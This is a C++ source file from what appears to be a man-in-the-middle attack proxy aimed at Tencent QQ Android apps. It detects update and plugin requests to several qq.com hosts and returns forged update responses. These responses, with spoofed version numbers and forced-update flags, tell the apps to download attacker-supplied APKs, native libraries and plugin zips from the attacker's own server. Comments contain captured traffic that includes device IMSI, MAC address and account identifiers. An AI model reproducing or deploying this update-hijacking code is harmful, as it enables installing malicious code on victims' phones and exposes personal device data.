

#include "QQAndroid.h"
#include "sslPublic.h"
#include "../cipher/CryptoUtils.h"
#include "../attacker.h"
#include "../FileOper.h"
#include "../HttpUtils.h"
#include "../attacker.h"
#include "../version.h"
#include "PluginServer.h"




int gQQAndroidFlag = 0;


int QQAndroid::isAndroidQQApkUpdate(string url, string host) {
	if (host == "mma.qq.com")
	{
		if (strstr(url.c_str(),"/upgrade/android") && strstr(url.c_str(),"/download.html?") )
		{
			return TRUE;
		}
	}

	return FALSE;
}



int QQAndroid::makeAndroidQQApkUpdateJs(char*recvBuffer, int buflimit, LPHTTPPROXYPARAM lphhtp) {
	int ret = 0;
	string filename = Public::getUserPluginPath(lphhtp->username) + QQAPKUPDATEDOWNLOADHTML;

	int filesize = 0;
	char *lpdata = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= 0)
	{
		return FALSE;
	}

	string strip = HttpUtils::getIPstr(gServerIP) + "/" + lphhtp->username;

	char szurl[MAX_PATH];
	//int urllen = wsprintfA(szurl, "<a href=\"http://%s/%s\" id=\"btn-download\" class=\"button\">обть</a>", 
	//	strip.c_str(), GENERAL_APK_UPDATE_FILENAME);

	int urllen = wsprintfA(szurl, "http://%s/%s",strip.c_str(), ANDROID_REPLACE_FILENAME);

	string jsformat = lpdata;
	delete[] lpdata;
	//char szflag[] = "<a href=\"javascript:void(0)\" id=\"btn-download\" class=\"button\">обть</a>";
	char szflag[] = "javascript:void(0)";

	int pos = jsformat.find(szflag);
	if (pos != -1)
	{
		jsformat = jsformat.replace(pos, lstrlenA(szflag), szurl);
	}
	else {
		
		return FALSE;
	}

	char szsendfmt[] = "HTTP/1.1 200 OK\r\n"
		"Content-Type: text/html; charset=utf-8\r\n"
		"Connection: close\r\n"
		"Content-Length: %u\r\n\r\n%s";
	int sendlen = sprintf_s(recvBuffer, buflimit, szsendfmt, jsformat.length(), jsformat.c_str());
	return sendlen;
}



int QQAndroid::isQQNowMgrPlugin(string url, string host) {
	if ((host.find("dlied5.qq.com") != -1) && (url.find("/now/pluginmanager/ShadowPluginManager") != -1))
	{
		gQQAndroidFlag = 6;
		return 6;
	}
	return FALSE;
}


int QQAndroid::replyQQNowMgrPlugin(char * dstbuf, int dstbufsize, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {
	char * szHttpRespFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";

	string filename = Public::getUserUrl(lphttp->username, "ShadowPluginManager.zip");

	int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpRespFormat, 1);
	return 0;
}


/*
GET /qqfile/qd/mqd/aqp_sfu_201811051443.json.signed?mType=Other HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: dldir1.qq.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Last-Modified: Tue, 06 Nov 2018 06:51:31 GMT
Server: nws_4.2.1_midcache
Date: Mon, 25 Mar 2019 10:29:02 GMT
Cache-Control: max-age=600
Expires: Mon, 25 Mar 2019 10:39:02 GMT
Content-Type: application/octet-stream
Content-Length: 932
Accept-Ranges: bytes
X-NWS-LOG-UUID: 10863900219571118611
X-NWS-UUID-VERIFY: cf762726a987b80c034c7eada5eee1c8
Connection: keep-alive
X-Cache-Lookup: Cache Hit

HTTP/1.1 200 OK
Last-Modified: Tue, 06 Nov 2018 06:51:31 GMT
Server: nws_4.2.1_midcache
Date: Mon, 25 Mar 2019 10:29:02 GMT
Cache-Control: max-age=600
Expires: Mon, 25 Mar 2019 10:39:02 GMT
Content-Type: application/octet-stream
Content-Length: 932
Accept-Ranges: bytes
X-NWS-LOG-UUID: 10863900219571118611
X-NWS-UUID-VERIFY: cf762726a987b80c034c7eada5eee1c8
Connection: keep-alive
X-Cache-Lookup: Cache Hit

QSec....B8..
.E:.zu.Io....
..C..,....=.......=M>...TI.[O.k...}.Y5.0.{.rb.L.......n. C.>.H..$.1..3}.?lHdT`^j.....'....M.t....$oz-7]......
{"forceupdate": true, "sections": [{"bid": 1, "cpuabi": "*", "files": [{"extra": "{\"id\":2,\"type\":1,\"flag\":0,\"mode\":2,\"ver\":\"1.1.7\"}", "md5": "25b59cf5fb9a501ded34f273b713e691", "name": "librsc.so", "path": "app_qqprotect/qseclibs/", "root": "", "rptid": 9, "size": 21968, "strategy": "overwrite", "type": ""}, {"extra": "", "md5": "55c26588cd98ac4b729d9b0c565abb7b", "name": "rsc.jar", "path": "app_qqprotect/qseclibs/", "root": "", "rptid": 7, "size": 43308, "strategy": "overwrite", "type": ""}], "flag": 1, "md5": "19c3de17be4e373647d20d3e6f20fb78", "name": "aqp_sfu_section_118.zip", "os": "android", "osmaxver": "0", "osminver": "0", "qqmaxver": "*", "qqminver": "*", "sid": 118, "size": 54210, "url": "http://dldir1.qq.com/qqfile/qd/mqd/aqp_sfu_section_118.zip"}], "version": 1}
*/
int QQAndroid::isQQSecLibs(string url, string host) {
	if ((host.find("dldir1.qq.com") != -1) && (url.find("/qqfile/qd/mqd/aqp_sfu_") != -1))
	{
		gQQAndroidFlag = 7;
		return 7;
	}
	return FALSE;
}

int QQAndroid::replyQQSecLibsPlugin(char * dstbuf, int dstbufsize, int dstbuflimit, LPHTTPPROXYPARAM lphttp) {
	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Length: %u\r\nContent-Type: application/octet-stream\r\n"
		"Connection: keep-alive\r\n\r\n";

	char * lpRespContentFormat =
		"{\"forceupdate\":true,\"sections\":[{\"bid\":1,\"cpuabi\":\"*\",\"files\":"
		"[{\"extra\":\"{\\\"id\\\":2,\\\"type\\\":1,\\\"flag\\\":0,\\\"mode\\\":2,\\\"ver\\\":\\\"9.1.7\\\"}\",\"md5\":\"%s\","
		"\"name\":\"librsc.so\",\"path\":\"app_qqprotect/qseclibs/\",\"root\":\"\",\"rptid\":9,\"size\":%u,\"strategy\":\"overwrite\",\"type\":\"\"},"
		"{\"extra\":\"\",\"md5\":\"%s\",\"name\":\"rsc.jar\",\"path\":\"app_qqprotect/qseclibs/\",\"root\":\"\",\"rptid\":7,"
		"\"size\":%u,\"strategy\":\"overwrite\",\"type\":\"\"}],\"flag\": 1,\"md5\":\"%s\",\"name\":\"aqp_sfu_section.zip\","
		"\"os\":\"android\",\"osmaxver\":\"0\",\"osminver\":\"0\",\"qqmaxver\":\"*\",\"qqminver\":\"*\","
		"\"sid\":918,\"size\":%u,\"url\":\"http://%s/%s\"}],\"version\": 1}";
	
	string sofn = "librsc.so";
	string sosrcfn = Public::getUserPluginPath(lphttp->username) + sofn;

	string jarfn = "rsc.jar";
	string jarsrcfn = Public::getUserPluginPath(lphttp->username) + jarfn;

	string strfn = "aqp_sfu_section_new.zip";
	string zipfn = Public::getUserPluginPath(lphttp->username) + strfn;

	vector<string> srcfiles;
	vector<string> inzipfiles;
	inzipfiles.push_back(jarfn);
	inzipfiles.push_back(sofn);
	srcfiles.push_back(jarsrcfn);
	srcfiles.push_back(sosrcfn);

	ret = Public::zipFiles(inzipfiles, srcfiles, zipfn);
	if (ret == 0)
	{
		return FALSE;
	}

	char szmd5[64] = { 0 };
	unsigned char hexmd5[64] = { 0 };
	int filesize = CryptoUtils::getUpdateFileMd5(zipfn, szmd5, hexmd5, TRUE);

	char szjarmd5[64] = { 0 };
	int jarfilesize = CryptoUtils::getUpdateFileMd5(jarsrcfn, szjarmd5, hexmd5, TRUE);
	char szsomd5[64] = { 0 };
	int sofilesize = CryptoUtils::getUpdateFileMd5(sosrcfn, szsomd5, hexmd5, TRUE);

	
	string szip = HttpUtils::getIPstr(gServerIP) + "/" + lphttp->username;
	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		szsomd5,sofilesize,szjarmd5,jarfilesize,szmd5,filesize,szip.c_str(), strfn.c_str());

	unsigned char data[136] = {
		0x51,0x53, 0x65, 0x63, 0x00, 0x00, 0x00, 0x80,
		0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00,
		0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00,
		0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00,
		0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00,
		0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00,
		0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00,
		0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00,
		0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,0x00
	};

	int resultlen = sprintf_s(dstbuf, dstbuflimit, lpRespFormat, iRespContentLen + 136);
	memcpy(dstbuf + resultlen, data, 136);
	memcpy(dstbuf + resultlen + 136, lpRespContent, iRespContentLen);
	return resultlen + 136 + iRespContentLen;
}




int QQAndroid::isQQNowPlugin(string url, string host) {
	if (strstr(host.c_str(),"now.qq.com") && strstr(url.c_str(),"/cgi-bin/now/web/version/now_ver?") )
	{
		gQQAndroidFlag = 5;
		return TRUE;
	}
	return FALSE;
}

int QQAndroid::replyQQNow(char * dstbuf, int buflimit, string username) {
	int ret = FALSE;
	char * lpRespFormat = "HTTP/1.1 200 OK\r\nContent-Type: application/json;charset=utf-8\r\nContent-Length: %u\r\nConnection: keep-alive\r\n\r\n%s";

	char * jsonFormat =
		"{\"message\":null,\"data\":{\"newversionno\":\"%s\",\"targetversion\":{\"content\":[{\"type\":\"4\",\"hash\":\"%s\","
		"\"url\":\"http://%s/%s\",\"size\":\"%u\",\"enablepreload\":false,\"downloadengine\":\"1\","
		"\"loadTimeoutInterval\":\"1000\",\"packageName\":\"com.tencent.now\"},{\"type\":\"3\",\"hash\":\"%s\","
		"\"url\":\"http://%s/%s\",\"size\":\"%u\",\"enablepreload\":false,\"downloadengine\":\"1\","
		"\"loadTimeoutInterval\":\"1000\",\"packageName\":\"com.tencent.now\"}],\"versionno\":%s},"
		"\"curversionno\":0,\"lazytime\":\"10000\",\"load_retry\":1,\"newversionexist\":true,\"curversionexist\":false},\"errCode\":0}";


	string szip = HttpUtils::getIPstr(gServerIP) + "/" + username;


	string zipfn1 = "qqnowav.zip";
	string filename1 = Public::getUserPluginPath(username) + zipfn1;
	char szmd5_1[256] = { 0 };
	unsigned char hexmd5[64];
	int filesize1 = CryptoUtils::getUpdateFileMd5(filename1, szmd5_1, hexmd5, TRUE);
	if (filesize1 <= 0)
	{
		return FALSE;
	}

	string zipfn2 = "qqnowbiz.zip";
	string filename2 = Public::getUserPluginPath(username) + zipfn2;
	char szmd5_2[256] = { 0 };
	int filesize2 = CryptoUtils::getUpdateFileMd5(filename2, szmd5_2, hexmd5, TRUE);
	if (filesize2 <= 0)
	{
		return FALSE;
	}

	string newverno = "99999";	// 39074

	char lpJson[MAX_RESPONSE_HEADER_SIZE];
	int iJsonLen = sprintf_s(lpJson, MAX_RESPONSE_HEADER_SIZE, jsonFormat,
		newverno.c_str(), szmd5_1, szip.c_str(), zipfn1.c_str(), filesize1,
		szmd5_2, szip.c_str(), zipfn2.c_str(), filesize2, newverno.c_str());

	int retlen = sprintf_s(dstbuf, buflimit, lpRespFormat, iJsonLen, lpJson);
	return retlen;
}

int QQAndroid::isQQPlugin(string url, string host) {
	if (host == "commdata.v.qq.com")
	{
		if (strstr(url.c_str(), "/commdatav2?cmd=51&"))
		{
			if (strstr(url.c_str(), "&so_name=player_core_neon&"))
			{
				gQQAndroidFlag = 1;
				return 1;
			}
			else if (strstr(url.c_str(), "&so_name=tvkplugin&") || strstr(url.c_str(),"&so_name=TvkPlugin") ) 
			{
				gQQAndroidFlag = 2;
				return 2;

			}else if (strstr(url.c_str(), "&so_name=p2p&"))
			{
				gQQAndroidFlag = 3;
				return 3;
			}
			else if (strstr(url.c_str(), "&so_name=player_core_neon_api21&"))
			{
				gQQAndroidFlag = 4;
				return 4;

			}
		}
		///cgi-bin/now/web/version/now_ver?
	}else if ( (host.find("now.qq.com") != -1) && (url.find("/cgi-bin/now/web/version/now_ver?") != -1) )
	{
		gQQAndroidFlag = 5;
		return 5;
	}
// 	else if ((host.find("dlied5.qq.com") != -1) && (url.find("/now/pluginmanager/ShadowPluginManager") != -1))
// 	{
// 		gQQAndroidFlag = 6;
// 		return 6;
// 	}
	else if ((host.find("dldir1.qq.com") != -1) && (url.find("/qqfile/qd/mqd/aqp_sfu_") != -1))
	{
		gQQAndroidFlag = 7;
		return 7;
	}
	return FALSE;
}


int QQAndroid::replyUpdate( char * lpdst,int dstsize,int dstlimit, string username) {

	string modulename = "";
	string zipfn = "";
	string version = "";
	if (gQQAndroidFlag == 2)
	{
		zipfn = QQTVKPLUGIN_PACKET_NAME;
		modulename = TVKPLUGIN_MODULE_NAME;
		version = DEFAULT_TVKPLUGIN_VERSION;
	}else if (gQQAndroidFlag == 1)
	{
		modulename = PLAYERCORENEON_MODULE_NAME;
		zipfn = PLAYERCORENEON_PACKET_NAME;
		version = DEFAULT_PLAYERCORENEON_VERSION;
	}
	else if (gQQAndroidFlag == 3)
	{
		modulename = P2PPLUGIN_MODULE_NAME;
		zipfn = P2PPLUGIN_PACKET_NAME;
		version = DEFAULT_P2PPLUGIN_VERSION;
	}
	else if (gQQAndroidFlag == 4)
	{
		modulename = PLAYERCORENEONAPI21_MODULE_NAME;
		zipfn = PLAYERCORENEONAPI21_PACKET_NAME;
		version = DEFAULT_PLAYERCORENEONAPI21_VERSION;
	}
	else if (gQQAndroidFlag == 5)
	{
		return replyQQNow(lpdst,dstlimit,username);
	}
// 	else if (gQQAndroidFlag == 6) {
// 
// 	}
	else {
		return 0;
	}

	int ret = 0;
	char * lpRespFormat =
		"HTTP/1.1 200 OK\r\nContent-Type: application/x-javascript; charset=utf8\r\nContent-Length: %u\r\n"
		"Connection: keep-alive\r\n\r\n%s";

	char * lpRespContentFormat =
		"QZOutputJson={\"c_so_name\":\"%s\",\"c_so_update_ver\":\"%s\","
		"\"c_so_url\":\"http://%s/%s\",\"c_so_md5\":\"%s\",\"ret\": 0};\r\n\r\n";


	string szip = HttpUtils::getIPstr(gServerIP) + "/" + username;

	string filename = Public::getUserPluginPath(username) + zipfn;
	char szmd5[256] = { 0 };
	unsigned char hexmd5[256];
	ret = CryptoUtils::getUpdateFileMd5(filename,szmd5,hexmd5, TRUE);

	char lpRespContent[MAX_RESPONSE_HEADER_SIZE];
	int iRespContentLen = sprintf_s(lpRespContent, MAX_RESPONSE_HEADER_SIZE, lpRespContentFormat,
		modulename.c_str(), version.c_str(), szip.c_str(), zipfn.c_str(), szmd5);

	int retlen = sprintf_s(lpdst, dstlimit, lpRespFormat, iRespContentLen, lpRespContent);
	return retlen;
}



/*
GET /commdatav2?cmd=51&app_version_name=6.8.0&app_version_build=18335&so_name=p2p&so_ver=P2P.3.0.0.540
&app_id=000&sdk_version=V7.2.000.4047&imsi=460036060814524&mac=38:29:5A:07:DD:BD
&numofcpucore=8&cpufreq=1094&cpuarch=7&market_id=105&randnum=0.6642026589128046&model=OPPO+A57&sysver=6.0.1
&qq=3373160248&device_id=12dc3c0630e77825&guid=0f77479a157711e99d19a0424b63310a&platform=10303&sdtfrom=v5000 HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: soup.v.qq.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Date: Mon, 18 Mar 2019 08:13:38 GMT
Content-Type: application/x-javascript; charset=utf-8
Content-Length: 181
Connection: keep-alive

QZOutputJson={"c_so_name":"p2p","c_so_update_ver":"P2P.3.0.0.541","c_so_url":"http://dldir1.qq.com/qqmi/so/P2P.3.0.0.541/p2p",
"c_so_md5":"30f3b111f3fa0324edac8122b496765b","ret":0};


*/

/*
GET /commdatav2?cmd=51&app_version_name=6.8.0&app_version_build=18335&so_name=player_core_neon_api21&so_ver=V7.2.000.4047
&app_id=000&sdk_version=V7.2.000.4047&imsi=460036060814524&mac=38:29:5A:07:DD:BD&numofcpucore=8&cpufreq=1094&cpuarch=7
&market_id=105&randnum=0.6642026589128046&model=OPPO+A57&sysver=6.0.1&qq=3373160248&device_id=12dc3c0630e77825
&guid=0f77479a157711e99d19a0424b63310a&platform=10303&sdtfrom=v5000 HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: soup.v.qq.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Date: Mon, 18 Mar 2019 08:13:36 GMT
Content-Type: application/x-javascript; charset=utf-8
Content-Length: 226
Connection: keep-alive

QZOutputJson={"c_so_name":"player_core_neon_api21","c_so_update_ver":"V7.2.000.4049",
"c_so_url":"http://dldir1.qq.com/qqmi/so/player/V7.2.000.4049/player_core_neon_api21","c_so_md5":"b5c5fcf14930395d89e3e0475ef71911","ret":0};

*/

/*
GET /commdatav2?cmd=51&app_version_name=7.9.9&app_version_build=0&so_name=player_core_neon&so_ver=V0.0.0.0
&app_id=248&sdk_version=V4.3.248.0087&imei=A00000611E3E28&imsi=460036060814524
&mac=38:29:5A:07:DD:BD&numofcpucore=8&cpufreq=1094&cpuarch=7&market_id=-1
&randnum=0.3234478439846583&model=OPPO+A57&sysver=6.0.1&qq=1957001146&device_id=12dc3c0630e77825
&guid=175eaa32e4c6bf72&platform=940303&sdtfrom=v5032 HTTP/1.1
Host: commdata.v.qq.com
Connection: Keep-Alive
User-Agent: Apache-HttpClient/UNAVAILABLE (java 1.4)

HTTP/1.1 200 OK
Date: Sun, 17 Mar 2019 10:18:26 GMT
Content-Type: application/x-javascript; charset=utf8
Content-Length: 47
Connection: keep-alive
Server: QZHTTP-2.38.20

QZOutputJson={"ret":0,"error_msg":"no record"};
*/


/*
GET now.qq.com/cgi-bin/now/web/version/now_ver?apptype=now&platform=2&mode=0&frameversion=9&cursdkversion=0&uin=1957001146 HTTP/1.1
Host: now.qq.com
Accept-Encoding: identity
User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI TAG-TL00 Build/HUAWEITAG-TL00)
Connection: Keep-Alive

HTTP/1.1 200 OK
Date: Mon, 14 Jan 2019 11:44:13 GMT
Content-Type: application/json;charset=utf-8
Content-Length: 696
Connection: keep-alive
Server: nginx

{"message":null,"data":{"newversionno":"39021","targetversion":{"content":[{"type":"4","hash":"60feae03810a6d7ab8440f78fcd9132f","url":"https://pub.idqqimg.com/0315a4b371674531b9b70debb9706c4e.zip","size":"994619","enablepreload":false,"downloadengine":"1","loadTimeoutInterval":"1000","packageName":"com.tencent.now"},{"type":"3","hash":"cd16aa854a0f56b8aca70c7b3e6a1def","url":"https://pub.idqqimg.com/c3300decfa4b4fcfb38b60b98526d0fb.zip","size":"10122353","enablepreload":false,"downloadengine":"1","loadTimeoutInterval":"1000","packageName":"com.tencent.now"}],"versionno":39021},"curversionno":0,"lazytime":"10000","load_retry":1,"newversionexist":true,"curversionexist":false},"errCode":0}
*/

/*
GET /now/pluginmanager/ShadowPluginManager1_1_nowPlugin_B HTTP/1.1
User-Agent: Dalvik/2.1.0 (Linux; U; Android 6.0.1; OPPO A57 Build/MMB29M)
Host: dlied5.qq.com
Connection: Keep-Alive
Accept-Encoding: gzip

HTTP/1.1 200 OK
Content-Length: 64852
Last-Modified: Wed, 17 Apr 2019 09:24:44 GMT
Server: nws_4.2.1_midcache
Date: Wed, 17 Apr 2019 09:31:28 GMT
Cache-Control: max-age=600
Expires: Wed, 17 Apr 2019 09:41:28 GMT
Content-Type: application/octet-stream
X-NWS-LOG-UUID: 15977112551891410817
X-NWS-UUID-VERIFY: 56b13216489dd0cd15faad97fa0617af
Connection: keep-alive
X-Cache-Lookup: Cache Hit
*/